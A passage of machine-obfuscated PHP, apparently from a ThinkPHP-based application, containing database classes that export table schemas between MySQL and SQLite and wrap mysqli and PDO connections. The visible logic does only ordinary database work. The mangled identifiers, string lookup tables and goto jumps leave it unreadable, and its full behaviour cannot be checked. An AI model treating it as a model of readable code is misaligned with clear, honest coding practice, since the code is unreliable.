$this->model()->db(); $“–œØÀ  = $âŞ—±ºÅ->getTables(); $’ÔĞæìÀ = TEMP_FILES . $¤‹“Œ…’[1150] . date($¤‹“Œ…’[263]) . $¤‹“Œ…’[8]; del_dir($’ÔĞæìÀ); mk_dir($’ÔĞæìÀ); $íêõà = $’ÔĞæìÀ . $¤‹“Œ…’[1151]; $‹ì–²…š = $’ÔĞæìÀ . $¤‹“Œ…’[1152]; $Å©¹áà  = $³¢ìÎ½ğ == $¤‹“Œ…’[23] ? $¤‹“Œ…’[864] : $¤‹“Œ…’[23]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\x74\141\154\154\x2f\x64\x61\x74\x61\x2f{$Å©¹áà }\x2e\163\161\x6c", $’ÔĞæìÀ); @touch($’ÔĞæìÀ . $³¢ìÎ½ğ . $¤‹“Œ…’[848]); $î¢®Ì«¬ = fopen($íêõà, $¤‹“Œ…’[1127]); $ãØ«º² = fopen($‹ì–²…š, $¤‹“Œ…’[1127]); if ($³¢ìÎ½ğ == $¤‹“Œ…’[23]) { $“–œØÀ  = array_diff($“–œØÀ , array($¤‹“Œ…’[844], $¤‹“Œ…’[845])); $ñ°œØÍ = array($¤‹“Œ…’[1153], $¤‹“Œ…’[1154], $¤‹“Œ…’[1155]); fwrite($ãØ«º², implode(PHP_EOL, $ñ°œØÍ) . PHP_EOL . PHP_EOL); foreach ($“–œØÀ  as $¯Ğ½ÅÀ«) { $Öê¥ßô = $this->sqlFromSqlite($¯Ğ½ÅÀ«); if (!$Öê¥ßô[$¤‹“Œ…’[23]]) { continue; } fwrite($ãØ«º², $Öê¥ßô[$¤‹“Œ…’[23]] . PHP_EOL . PHP_EOL); if (!in_array($¯Ğ½ÅÀ«, $ô¨Ùã®®)) { fwrite($î¢®Ì«¬, $Öê¥ßô[$¤‹“Œ…’[864]] . PHP_EOL . PHP_EOL); } } } else { foreach ($“–œØÀ  as $¯Ğ½ÅÀ«) { $Öê¥ßô = $this->sqlFromMysql($¯Ğ½ÅÀ«); if (!$Öê¥ßô[$¤‹“Œ…’[864]]) { continue; } fwrite($î¢®Ì«¬, $Öê¥ßô[$¤‹“Œ…’[864]] . PHP_EOL . PHP_EOL); if (!in_array($¯Ğ½ÅÀ«, $ô¨Ùã®®)) { fwrite($ãØ«º², $Öê¥ßô[$¤‹“Œ…’[23]] . PHP_EOL . PHP_EOL); } } } fclose($î¢®Ì«¬); fclose($ãØ«º²); $Ïåò™¸Î = array($¤‹“Œ…’[864] => $íêõà, $¤‹“Œ…’[23] => $‹ì–²…š); return $ÙÅÛàİø ? $Ïåò™¸Î[$ÙÅÛàİø] : $Ïåò™¸Î; } public function dbType($àÖæµ¡ = false) { $åšø•‚¯ =& $_SERVER[ˆûùúÊ¯]; $Î²ˆÄéô = $àÖæµ¡ ? $GLOBALS[$åšø•‚¯[6]][$åšø•‚¯[31]] : $this->database; $Î²ˆÄéô = array_change_key_case($Î²ˆÄéô); $¨Õ‚óÁ´ = $Î²ˆÄéô[$åšø•‚¯[1028]]; if ($¨Õ‚óÁ´ == $åšø•‚¯[1025]) { $„ø§Šõ™ = explode($åšø•‚¯[4], $Î²ˆÄéô[$åšø•‚¯[1034]]); $¨Õ‚óÁ´ = $„ø§Šõ™[0]; } $˜„Šõê† = array($åšø•‚¯[1156] => $åšø•‚¯[23], $åšø•‚¯[973] => $åšø•‚¯[864]); if (isset($˜„Šõê†[$¨Õ‚óÁ´])) { $¨Õ‚óÁ´ = $˜„Šõê†[$¨Õ‚óÁ´]; } return $¨Õ‚óÁ´; } public function sqlFromMysql($Ìºí¨Ş, $ÜçğÛê = '') { $‚Úõä ¼ =& $_SERVER[ˆûùúÊ¯]; $‡–‹‰Ïù = $this->model()->db(); $Û¸¶º’÷ = $‡–‹‰Ïù->query($‚Úõä ¼[1157] . $Ìºí¨Ş . $‚Úõä ¼[437]); if (!$Û¸¶º’÷ || !$Û¸¶º’÷[0]) { return !1; } $„ôİÀ–Ü = _get($Û¸¶º’÷[0], $‚Úõä ¼[1158], $‚Úõä ¼[12]); if (!$„ôİÀ–Ü) { return !1; } $£ÎÙâÚ = "\104\122\117\120\x20\124\101\x42\114\x45\40\111\106\40\x45\130\x49\123\124\123\40\x60{$Ìºí¨Ş}\x60\x3b" . PHP_EOL . $„ôİÀ–Ü . $‚Úõä ¼[81]; if ($ÜçğÛê && $ÜçğÛê == $‚Úõä ¼[864]) { return $£ÎÙâÚ; } $Ù”İéÛ  = array_change_key_case($GLOBALS[$‚Úõä ¼[6]][$‚Úõä ¼[31]]); $•ŒÔıµ´ = $Ù”İéÛ [$‚Úõä ¼[1033]]; $×¶ß±¥° = $‚Úõä ¼[1159] . $•ŒÔıµ´ . $‚Úõä ¼[1160] . $Ìºí¨Ş . $‚Úõä ¼[68]; $ı³ß‡Ñ§ = $‚Úõä ¼[1161] . $Ìºí¨Ş . $‚Úõä ¼[961]; $²õûô›Ğ = $‡–‹‰Ïù->query($×¶ß±¥°); if (empty($²õûô›Ğ)) { $ àı»ûé = array($‚Úõä ¼[864] => $‚Úõä ¼[12], $‚Úõä ¼[23] => $‚Úõä ¼[12]); return $ÜçğÛê ? $ àı»ûé[$ÜçğÛê] : $ àı»ûé; } $²ûË’¼„ = $‡–‹‰Ïù->query($ı³ß‡Ñ§); $ù“ä«€ = $‚Úõä ¼[12]; $è¢Ü¾Ä = array(); foreach ($²ûË’¼„ as $“ÏÛà ) { if (!$ù“ä«€ && $“ÏÛà [$‚Úõä ¼[1162]] == $‚Úõä ¼[1163]) { $ù“ä«€ = $“ÏÛà [$‚Úõä ¼[1164]]; } if (isset($è¢Ü¾Ä[$“ÏÛà [$‚Úõä ¼[1162]]])) { $è¢Ü¾Ä[$“ÏÛà [$‚Úõä ¼[1162]]][$‚Úõä ¼[1165]][] = $“ÏÛà [$‚Úõä ¼[1164]]; continue; } $è¢Ü¾Ä[$“ÏÛà [$‚Úõä ¼[1162]]] = array($‚Úõä ¼[1166] => $“ÏÛà [$‚Úõä ¼[1162]], $‚Úõä ¼[1165] => array($“ÏÛà [$‚Úõä ¼[1164]]), $‚Úõä ¼[1167] => $“ÏÛà [$‚Úõä ¼[1168]] == $‚Úõä ¼[98] ? 0 : 1); } $àœ…ñëõ = array(); foreach ($è¢Ü¾Ä as $“ÏÛà ) { $—€Ç÷ô¢ = $“ÏÛà [$‚Úõä ¼[1166]] == $‚Úõä ¼[1163]; $ŒÔÎõäå = array($‚Úõä ¼[1169], $“ÏÛà [$‚Úõä ¼[1167]] == $‚Úõä ¼[98] && !$—€Ç÷ô¢ ? $‚Úõä ¼[1170] : $‚Úõä ¼[12], $‚Úõä ¼[1171], $‚Úõä ¼[1172] . $Ìºí¨Ş . $‚Úõä ¼[11] . ($—€Ç÷ô¢ ? $‚Úõä ¼[1173] : $“ÏÛà [$‚Úõä ¼[1166]]) . $‚Úõä ¼[128], $‚Úõä ¼[1174], $‚Úõä ¼[128] . $Ìºí¨Ş . $‚Úõä ¼[128], $‚Úõä ¼[1175] . implode($‚Úõä ¼[1176], $“ÏÛà [$‚Úõä ¼[1165]]) . $‚Úõä ¼[1177]); $àœ…ñëõ[] = implode($‚Úõä ¼[63], $ŒÔÎõäå) . $‚Úõä ¼[81]; } $Õå¯–İ = array(); $úÇú»  = array($‚Úõä ¼[1178] => $‚Úõä ¼[1179], $‚Úõä ¼[1179] => $‚Úõä ¼[1179], $‚Úõä ¼[340] => $‚Úõä ¼[367], $‚Úõä ¼[339] => $‚Úõä ¼[367]); foreach ($²õûô›Ğ as $“ÏÛà ) { $ŒÔÎõäå = array($‚Úõä ¼[128] . $“ÏÛà [$‚Úõä ¼[1180]] . $‚Úõä ¼[128], isset($úÇú» [$“ÏÛà [$‚Úõä ¼[1181]]]) ? $úÇú» [$“ÏÛà [$‚Úõä ¼[1181]]] : $“ÏÛà [$‚Úõä ¼[1182]], $“ÏÛà [$‚Úõä ¼[1183]] == $‚Úõä ¼[959] ? $‚Úõä ¼[1184] : $‚Úõä ¼[1185], $“ÏÛà [$‚Úõä ¼[1180]] == $ù“ä«€ ? $‚Úõä ¼[1186] : $‚Úõä ¼[12], $“ÏÛà [$‚Úõä ¼[1010]] ? strtoupper(str_replace($‚Úõä ¼[11], $‚Úõä ¼[12], $“ÏÛà [$‚Úõä ¼[1010]])) : $‚Úõä ¼[12]); $Õå¯–İ[] = trim(implode($‚Úõä ¼[63], $ŒÔÎõäå)); } $ßøŒ–ùó = array($‚Úõä ¼[1187] . $Ìºí¨Ş . $‚Úõä ¼[1188], $‚Úõä ¼[1189] . $Ìºí¨Ş . $‚Úõä ¼[1190], implode($‚Úõä ¼[60] . PHP_EOL, $Õå¯–İ), $‚Úõä ¼[1007]); $şäŠ³ç = implode(PHP_EOL, array_merge($ßøŒ–ùó, $àœ…ñëõ)); if ($ÜçğÛê && $ÜçğÛê == $‚Úõä ¼[23]) { return $şäŠ³ç; } $ àı»ûé = array($‚Úõä ¼[864] => $£ÎÙâÚ, $‚Úõä ¼[23] => $şäŠ³ç); return $ÜçğÛê ? $ àı»ûé[$ÜçğÛê] : $ àı»ûé; } public function sqlFromSqlite($›Ì Â, $µ˜­Ü±ı = '') { $¤‡­Œ‰Ë =& $_SERVER[ˆûùúÊ¯]; $íë©›Ş = $this->model()->db(); $ü‰Ç„®ú = "\120\122\x41\x47\115\101\x20\x54\x41\x42\x4c\105\x5f\111\116\x46\x4f\40\x28\47{$›Ì Â}\47\51"; $ªïÏÎä… = "\x53\105\x4c\x45\x43\124\40\x2a\x20\x46\122\x4f\115\40\163\161\x6c\151\x74\145\x5f\x6d\141\163\x74\145\162\x20\127\110\105\122\105\x20\164\x62\154\137\x6e\x61\x6d\x65\40\75\40\x27{$›Ì Â}\x27"; $®œ‡ãÒ = $íë©›Ş->query($ü‰Ç„®ú); if (empty($®œ‡ãÒ)) { $‚Ş¼ßë‡ = array($¤‡­Œ‰Ë[864] => $¤‡­Œ‰Ë[12], $¤‡­Œ‰Ë[23] => $¤‡­Œ‰Ë[12]); return $µ˜­Ü±ı ? $‚Ş¼ßë‡[$µ˜­Ü±ı] : $‚Ş¼ßë‡; } $Ğ™€İÔ« = $íë©›Ş->query($ªïÏÎä…); $éÌ¤ÛµÒ = $è‚ïÅ€» = array(); foreach ($Ğ™€İÔ« as $ö”¯¸îœ) { if ($ö”¯¸îœ[$¤‡­Œ‰Ë[43]] == $¤‡­Œ‰Ë[331]) { $éÌ¤ÛµÒ[] = $ö”¯¸îœ[$¤‡­Œ‰Ë[1191]]; } else { $è‚ïÅ€»[$ö”¯¸îœ[$¤‡­Œ‰Ë[42]]] = $ö”¯¸îœ[$¤‡­Œ‰Ë[1191]]; } } $»€Ø‹­Å = array_merge(array($¤‡­Œ‰Ë[1187] . $›Ì Â . $¤‡­Œ‰Ë[128]), $éÌ¤ÛµÒ, array_values($è‚ïÅ€»)); $»€Ø‹­Å = implode($¤‡­Œ‰Ë[81] . PHP_EOL, $»€Ø‹­Å) . $¤‡­Œ‰Ë[81]; if ($µ˜­Ü±ı && $µ˜­Ü±ı == $¤‡­Œ‰Ë[23]) { return $»€Ø‹­Å; } $øİ±Ş‚ = array(); $Â´Ïêî = array($¤‡­Œ‰Ë[1179] => $¤‡­Œ‰Ë[1192], $¤‡­Œ‰Ë[367] => $¤‡­Œ‰Ë[1193]); $ì‹— Ì¢ = $¤‡­Œ‰Ë[12]; foreach ($®œ‡ãÒ as $ö”¯¸îœ) { if ($ö”¯¸îœ[$¤‡­Œ‰Ë[67]] == $¤‡­Œ‰Ë[98]) { $ì‹— Ì¢ = $ö”¯¸îœ[$¤‡­Œ‰Ë[42]]; } $Íò§õæÙ = array($¤‡­Œ‰Ë[437] . $ö”¯¸îœ[$¤‡­Œ‰Ë[42]] . $¤‡­Œ‰Ë[437], isset($Â´Ïêî[$ö”¯¸îœ[$¤‡­Œ‰Ë[43]]]) ? $Â´Ïêî[$ö”¯¸îœ[$¤‡­Œ‰Ë[43]]] : $ö”¯¸îœ[$¤‡­Œ‰Ë[43]], $ö”¯¸îœ[$¤‡­Œ‰Ë[45]] == $¤‡­Œ‰Ë[98] ? $¤‡­Œ‰Ë[1184] : $¤‡­Œ‰Ë[1194] . $ö”¯¸îœ[$¤‡­Œ‰Ë[66]], $ö”¯¸îœ[$¤‡­Œ‰Ë[67]] == $¤‡­Œ‰Ë[98] ? $¤‡­Œ‰Ë[1195] : $¤‡­Œ‰Ë[12]); $øİ±Ş‚[] = trim(implode($¤‡­Œ‰Ë[63], $Íò§õæÙ)); } foreach ($è‚ïÅ€» as $‰‚×¦Ÿ => $È»š…) { $öíâ£« = str_replace($¤‡­Œ‰Ë[1196] . $›Ì Â . $¤‡­Œ‰Ë[11], $¤‡­Œ‰Ë[12], $‰‚×¦Ÿ); $ÍÓÃµÜé = str_replace(array($¤‡­Œ‰Ë[128], $¤‡­Œ‰Ë[1018]), $¤‡­Œ‰Ë[437], substr($È»š…, stripos($È»š…, $¤‡­Œ‰Ë[312]))); if ($öíâ£« == $¤‡­Œ‰Ë[1173]) { $ÑÖ€„Í = $¤‡­Œ‰Ë[1197] . $ì‹— Ì¢ . $¤‡­Œ‰Ë[1198]; } else { $ÑÖ€„Í = (stripos($öíâ£«, $¤‡­Œ‰Ë[11]) ? $¤‡­Œ‰Ë[1199] : $¤‡­Œ‰Ë[12]) . ($¤‡­Œ‰Ë[1200] . $öíâ£« . $¤‡­Œ‰Ë[1201] . $ÍÓÃµÜé); } $øİ±Ş‚[] = $ÑÖ€„Í; } $€®İ­é = array($¤‡­Œ‰Ë[1202] . $›Ì Â . $¤‡­Œ‰Ë[1203], $¤‡­Œ‰Ë[1204] . $›Ì Â . $¤‡­Œ‰Ë[1205], implode($¤‡­Œ‰Ë[60] . PHP_EOL, $øİ±Ş‚), $¤‡­Œ‰Ë[1206]); $¸ËœÁ¼× = implode(PHP_EOL, $€®İ­é); if ($µ˜­Ü±ı && $µ˜­Ü±ı == $¤‡­Œ‰Ë[864]) { return $¸ËœÁ¼×; } $‚Ş¼ßë‡ = array($¤‡­Œ‰Ë[864] => $¸ËœÁ¼×, $¤‡­Œ‰Ë[23] => $»€Ø‹­Å); return $µ˜­Ü±ı ? $‚Ş¼ßë‡[$µ˜­Ü±ı] : $‚Ş¼ßë‡; } } goto Eôªïñó‹¤; AŞï¸¡šË¤: class DbMysqli extends Db { public function __construct($ÎûÃ¼ûÁ = '') { $ºøŞéŞ® =& $_SERVER[ˆûùúÊ¯]; if (!extension_loaded($ºøŞéŞ®[973])) { think_exception(think_lang($ºøŞéŞ®[24]) . $ºøŞéŞ®[974]); } if (!empty($ÎûÃ¼ûÁ)) { $this->config = $ÎûÃ¼ûÁ; if (empty($this->config[$ºøŞéŞ®[27]])) { $this->config[$ºøŞéŞ®[27]] = $ºøŞéŞ®[12]; } } } public function connect($ÆšŸª‰ = '', $†¡ï¿ñÔ = 0) { $äş¦Ü¨ =& $_SERVER[ˆûùúÊ¯]; if (!isset($this->linkID[$†¡ï¿ñÔ])) { if (empty($ÆšŸª‰)) { $ÆšŸª‰ = $this->config; } $this->linkID[$†¡ï¿ñÔ] = new mysqli($ÆšŸª‰[$äş¦Ü¨[947]], $ÆšŸª‰[$äş¦Ü¨[949]], $ÆšŸª‰[$äş¦Ü¨[950]], $ÆšŸª‰[$äş¦Ü¨[31]], $ÆšŸª‰[$äş¦Ü¨[948]] ? intval($ÆšŸª‰[$äş¦Ü¨[948]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $íö¨…­ = $this->linkID[$†¡ï¿ñÔ]->server_version; $this->linkID[$†¡ï¿ñÔ]->query($äş¦Ü¨[951] . think_config($äş¦Ü¨[952]) . $äş¦Ü¨[68]); if ($íö¨…­ > $äş¦Ü¨[953]) { $this->linkID[$†¡ï¿ñÔ]->query($äş¦Ü¨[954]); } $this->connected = !0; if (1 != think_config($äş¦Ü¨[32])) { unset($this->config); } } return $this->linkID[$†¡ï¿ñÔ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ìÑÈÁò) { $Â­½›ÁÊ =& $_SERVER[ˆûùúÊ¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ìÑÈÁò; if ($this->queryID) { $this->free(); } think_action_status($Â­½›ÁÊ[33], 1); think_status($Â­½›ÁÊ[34]); $this->queryID = $this->_linkID->query($ìÑÈÁò); if ($this->_linkID->more_results()) { while (($©ª›õøè = $this->_linkID->next_result()) != NULL) { $©ª›õøè->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($æ¢—¦øÇ) { $ì”ëÆ¿Ã =& $_SERVER[ˆûùúÊ¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $æ¢—¦øÇ; if ($this->queryID) { $this->free(); } think_action_status($ì”ëÆ¿Ã[35], 1); think_status($ì”ëÆ¿Ã[34]); $ûöóÀ”Ê = $this->_linkID->query($æ¢—¦øÇ); $this->debug(); if (!1 === $ûöóÀ”Ê) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ıİò§“ñ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ıİò§“ñ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¶…ò¢¦Ê = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¶…ò¢¦Ê) { $this->error(); return !1; } } return !0; } private function getAll() { $ÁöÀĞ© = array(); if ($this->numRows > 0) { for ($¥ §şË = 0; $¥ §şË < $this->numRows; $¥ §şË++) { $ÁöÀĞ©[$¥ §şË] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ÁöÀĞ©; } public function getFields($ÌÇÆ‚…ç) { $Ùô“«ƒ¨ =& $_SERVER[ˆûùúÊ¯]; $Èã­åŸ• = $this->query($Ùô“«ƒ¨[958] . $this->parseKey($ÌÇÆ‚…ç)); $ÀŸ¾÷Õ§ = array(); if ($Èã­åŸ•) { foreach ($Èã­åŸ• as $Ë¦êøŒ => $¯Íé¥É) { $ÀŸ¾÷Õ§[$¯Íé¥É[$Ùô“«ƒ¨[41]]] = array($Ùô“«ƒ¨[42] => $¯Íé¥É[$Ùô“«ƒ¨[41]], $Ùô“«ƒ¨[43] => $¯Íé¥É[$Ùô“«ƒ¨[44]], $Ùô“«ƒ¨[45] => (bool) ($¯Íé¥É[$Ùô“«ƒ¨[46]] === $Ùô“«ƒ¨[12]), $Ùô“«ƒ¨[47] => $¯Íé¥É[$Ùô“«ƒ¨[48]], $Ùô“«ƒ¨[49] => strtolower($¯Íé¥É[$Ùô“«ƒ¨[50]]) == $Ùô“«ƒ¨[51], $Ùô“«ƒ¨[52] => strtolower($¯Íé¥É[$Ùô“«ƒ¨[53]]) == $Ùô“«ƒ¨[54]); } } return $ÀŸ¾÷Õ§; } public function getTables($ÖÙ‰öäû = '') { $Ÿˆº´¨¼ =& $_SERVER[ˆûùúÊ¯]; $Ş«‘Û“ = !empty($ÖÙ‰öäû) ? $Ÿˆº´¨¼[960] . $ÖÙ‰öäû . $Ÿˆº´¨¼[961] : $Ÿˆº´¨¼[962]; $¨Í°úË = $this->query($Ş«‘Û“); $®Ã ûäÏ = array(); if ($¨Í°úË) { foreach ($¨Í°úË as $ÅõüÛ± => $¤Î”£ÖŞ) { $®Ã ûäÏ[$ÅõüÛ±] = current($¤Î”£ÖŞ); } } return $®Ã ûäÏ; } public function replace($œ‘°áş, $À¾ Œ¶ = array()) { $Û¢á¨»© =& $_SERVER[ˆûùúÊ¯]; foreach ($œ‘°áş as $Şç˜Ş´Ÿ => $–¤»åß¿) { $Î„¹ÒúÜ = $this->parseValue($–¤»åß¿); if (is_scalar($Î„¹ÒúÜ)) { $²ñ‰Œ¯ë[] = $Î„¹ÒúÜ; $ˆ°Î«ü[] = $this->parseKey($Şç˜Ş´Ÿ); } } $„¼Üç…ü = $Û¢á¨»©[963] . $this->parseTable($À¾ Œ¶[$Û¢á¨»©[331]]) . $Û¢á¨»©[964] . implode($Û¢á¨»©[60], $ˆ°Î«ü) . $Û¢á¨»©[965] . implode($Û¢á¨»©[60], $²ñ‰Œ¯ë) . $Û¢á¨»©[966]; return $this->execute($„¼Üç…ü); } public function insertAll($Ù¢ËÌÁ¬, $¢ÖØ = array(), $¶€í­“æ = false) { $¶€ÛÅØ¿ =& $_SERVER[ˆûùúÊ¯]; if (!is_array($Ù¢ËÌÁ¬[0])) { return !1; } $ª÷÷æÜÉ = array_keys($Ù¢ËÌÁ¬[0]); $ÏÔ³ÒÚ = array(); foreach ($Ù¢ËÌÁ¬ as $¬Šù»˜ö) { $ßËÒıÜÙ = array(); foreach ($¬Šù»˜ö as $„ûıõ¸ => $²ı¨Šı) { $²ı¨Šı = $this->parseValue($²ı¨Šı); if (is_scalar($²ı¨Šı)) { $ßËÒıÜÙ[] = $²ı¨Šı; } } $ÏÔ³ÒÚ[] = $¶€ÛÅØ¿[312] . implode($¶€ÛÅØ¿[60], $ßËÒıÜÙ) . $¶€ÛÅØ¿[966]; } array_walk($ª÷÷æÜÉ, array($this, $¶€ÛÅØ¿[967])); $î¦æÆæû = $¶€í­“æ ? $¶€ÛÅØ¿[968] : $¶€ÛÅØ¿[969]; $×­Ü¯â = $î¦æÆæû . $¶€ÛÅØ¿[970] . $this->parseTable($¢ÖØ[$¶€ÛÅØ¿[331]]) . $¶€ÛÅØ¿[964] . implode($¶€ÛÅØ¿[60], $ª÷÷æÜÉ) . $¶€ÛÅØ¿[971] . implode($¶€ÛÅØ¿[60], $ÏÔ³ÒÚ); return $this->execute($×­Ü¯â); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ªšõÁËß =& $_SERVER[ˆûùúÊ¯]; $this->error = $this->_linkID->errno . $ªšõÁËß[4] . $this->_linkID->error; if ($ªšõÁËß[12] != $this->queryStr) { $this->error .= LNG($ªšõÁËß[58]) . $this->queryStr; } think_trace($this->error, $ªšõÁËß[12], $ªšõÁËß[59]); return $this->error; } public function escapeString($×—·Ëóé) { if ($this->_linkID) { return $this->_linkID->real_escape_string($×—·Ëóé); } else { return addslashes($×—·Ëóé); } } public function parseKey(&$æŸúÚ®, $ èµêÔº = true) { $öüãÅúâ =& $_SERVER[ˆûùúÊ¯]; if ($ èµêÔº) { $æŸúÚ® = $this->parseKeyCheck($æŸúÚ®); } if ($æŸúÚ® != $öüãÅúâ[212] && !preg_match($öüãÅúâ[972], $æŸúÚ®)) { $æŸúÚ® = $öüãÅúâ[437] . trim($æŸúÚ®, $öüãÅúâ[437]) . $öüãÅúâ[437]; } return $æŸúÚ®; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($®‰Ôƒã¬ = '') { $¬ñƒ«ø¶ =& $_SERVER[ˆûùúÊ¯]; if (!class_exists($¬ñƒ«ø¶[975])) { think_exception(think_lang($¬ñƒ«ø¶[24]) . $¬ñƒ«ø¶[976]); } if (!empty($®‰Ôƒã¬)) { $this->config = $®‰Ôƒã¬; if (empty($this->config[$¬ñƒ«ø¶[27]])) { $this->config[$¬ñƒ«ø¶[27]] = array(); } } } public function connect($–ˆñê‰É = '', $„¢úãò¤ = 0) { $†Ñƒàô =& $_SERVER[ˆûùúÊ¯]; if (!isset($this->linkID[$„¢úãò¤])) { if (empty($–ˆñê‰É)) { $–ˆñê‰É = $this->config; } $Ë’ÓĞ = !empty($–ˆñê‰É[$†Ñƒàô[27]][$†Ñƒàô[28]]) ? $–ˆñê‰É[$†Ñƒàô[27]][$†Ñƒàô[28]] : $this->pconnect; if ($Ë’ÓĞ) { $–ˆñê‰É[$†Ñƒàô[27]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$„¢úãò¤] = new PDO($–ˆñê‰É[$†Ñƒàô[977]], $–ˆñê‰É[$†Ñƒàô[949]], $–ˆñê‰É[$†Ñƒàô[950]], $–ˆñê‰É[$†Ñƒàô[27]]); } catch (PDOException $—¸€ßİï) { think_exception($—¸€ßİï->getMessage()); } $this->dbType = $this->_getDsnType($–ˆñê‰É[$†Ñƒàô[977]]); if (in_array($this->dbType, array($†Ñƒàô[978], $†Ñƒàô[979], $†Ñƒàô[980], $†Ñƒàô[981]))) { think_exception($†Ñƒàô[982] . $this->dbType . $†Ñƒàô[983] . $this->dbType . $†Ñƒàô[984]); } if (!$this->linkID[$„¢úãò¤]) { think_exception($†Ñƒàô[985]); } try { $this->linkID[$„¢úãò¤]->exec($†Ñƒàô[986] . think_config($†Ñƒàô[952])); } catch (Exception $—¸€ßİï) { } $this->connected = !0; if (1 != think_config($†Ñƒàô[32])) { unset($this->config); } } return $this->linkID[$„¢úãò¤]; } public function free() { $this->PDOStatement = null; } public function query($„À¾ÏÍ¶, $÷ŞæÂ¡ = array()) { $ÓéÀä’ =& $_SERVER[ˆûùúÊ¯]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $„À¾ÏÍ¶; if (!empty($÷ŞæÂ¡)) { $this->queryStr .= $ÓéÀä’[987] . print_r($÷ŞæÂ¡, !0) . $ÓéÀä’[988]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÓéÀä’[33], 1); think_status($ÓéÀä’[34]); $this->PDOStatement = $this->_linkID->prepare($„À¾ÏÍ¶); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ıîÄé¤ = $this->PDOStatement->execute($÷ŞæÂ¡); $this->debug(); if (!1 === $ıîÄé¤) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($åËÃ´¾ã, $…¸ıÈÖ£ = array()) { $‹æÔ„ûº =& $_SERVER[ˆûùúÊ¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $åËÃ´¾ã; if (!empty($…¸ıÈÖ£)) { $this->queryStr .= $‹æÔ„ûº[987] . print_r($…¸ıÈÖ£, !0) . $‹æÔ„ûº[988]; } $¹ÙùÉœÊ = !1; if ($this->dbType == $‹æÔ„ûº[981]) { if (preg_match($‹æÔ„ûº[989], $this->queryStr, $ÀÏÆßª)) { $this->table = think_config($‹æÔ„ûº[990]) . str_ireplace(think_config($‹æÔ„ûº[991]), $‹æÔ„ûº[430], $ÀÏÆßª[2]); $¹ÙùÉœÊ = (bool) $this->query($‹æÔ„ûº[992] . strtoupper($this->table) . $‹æÔ„ûº[68]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($‹æÔ„ûº[35], 1); think_status($‹æÔ„ûº[34]); $this->PDOStatement = $this->_linkID->prepare($åËÃ´¾ã); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ò±èâö› = $this->PDOStatement->execute($…¸ıÈÖ£); $this->debug(); if (!1 === $ò±èâö›) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($¹ÙùÉœÊ || preg_match($‹æÔ„ûº[993], $åËÃ´¾ã)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $æÔÜš†ú = $this->_linkID->commit(); $this->transTimes = 0; if (!$æÔÜš†ú) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $õº¦›ö² = $this->_linkID->rollback(); $this->transTimes = 0; if (!$õº¦›ö²) { $this->error(); return !1; } } return !0; } private function getAll() { $•úµ÷¼™ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($•úµ÷¼™); return $•úµ÷¼™; } public function getFields($¸óì²Š¢) { $¦Ã Å¿ =& $_SERVER[ˆûùúÊ¯]; $this->initConnect(!0); if (think_config($¦Ã Å¿[994])) { $ËÅçş¬» = str_replace($¦Ã Å¿[995], $¸óì²Š¢, think_config($¦Ã Å¿[994])); } else { switch ($this->dbType) { case $¦Ã Å¿[978]: case $¦Ã Å¿[996]: $ËÅçş¬» = "\x53\105\114\x45\103\x54\40\40\40\x63\x6f\154\x75\155\156\137\x6e\x61\x6d\x65\x20\x61\163\40\x27\x4e\141\155\x65\x27\x2c\40\40\x20\144\x61\164\141\137\164\x79\x70\145\x20\x61\x73\x20\x27\x54\171\x70\x65\x27\54\40\x20\40\x63\157\154\165\x6d\156\137\144\x65\x66\x61\165\x6c\x74\40\x61\163\40\x27\104\x65\146\141\x75\x6c\x74\47\x2c\40\40\40\x69\x73\x5f\156\x75\154\154\x61\x62\x6c\145\40\x61\x73\40\x27\x4e\165\x6c\x6c\47\xa\11\11\x46\122\117\x4d\x9\x69\156\x66\157\162\155\x61\x74\151\x6f\156\137\x73\143\150\x65\x6d\141\x2e\x74\x61\142\x6c\x65\163\x20\x41\x53\40\x74\xa\11\x9\x4a\x4f\x49\116\x9\151\x6e\x66\157\x72\155\x61\x74\x69\157\x6e\137\x73\x63\150\x65\x6d\141\x2e\143\x6f\154\165\155\156\x73\x20\101\x53\x20\143\xa\11\11\x4f\x4e\40\x20\x74\56\164\141\142\154\145\137\143\x61\164\141\x6c\x6f\147\x20\75\40\x63\x2e\x74\141\142\154\145\137\x63\x61\x74\141\154\157\x67\12\11\x9\x41\x4e\x44\40\x74\x2e\164\x61\142\x6c\145\x5f\163\143\x68\145\155\141\40\75\x20\143\x2e\164\141\142\x6c\x65\x5f\x73\x63\150\145\x6d\141\xa\1